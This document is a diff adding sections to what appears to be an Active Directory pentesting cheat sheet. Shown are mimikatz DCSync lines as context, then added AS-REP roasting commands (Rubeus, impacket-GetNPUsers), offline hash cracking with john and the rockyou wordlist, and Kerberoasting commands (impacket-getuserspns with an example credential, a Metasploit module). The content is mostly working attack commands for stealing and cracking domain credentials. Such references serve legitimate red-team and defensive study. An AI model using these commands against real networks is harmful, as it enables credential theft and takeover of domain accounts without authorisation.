@@ -115,3 +115,33 @@ mimikatz # lsadump::dcsync /user:Administrator
 
 mimikatz # lsadump::dcsync /user:krbtgt
 ```
+
+**AS-REP ROASTING ATTACK:**
+
+This attack works for domain users that have the "DONT_REQ_PREAUTH" property *useraccountcontrol* set. 
+```
+# From Rubeus
+C:\> .\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
+
+# Check ASREPRoast for all domain users (credentials required)
+~# impacket-GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]>
+
+# Check ASREPRoast for a list of users (no credentials required)
+~# impacket-GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]>
+
+# Now we will attempt to crack the hashes obtained
+~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+**KERBEROASTING ATTACK:**
+
+The essence of this attack is to crack the encrypted key which was used to generate the TGS from where we extract the encrypted key to crack.
+
+You need valid domain credentials to perform this attack.
+
+```
+~# impacket-getuserspns -request contoso.com/trike:'DevT$st34'@192.168.1.1
+
+msf > use auxiliary/gather/get_user_spns
+```
+For Windows exploitation(manual and automatic) review this link: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
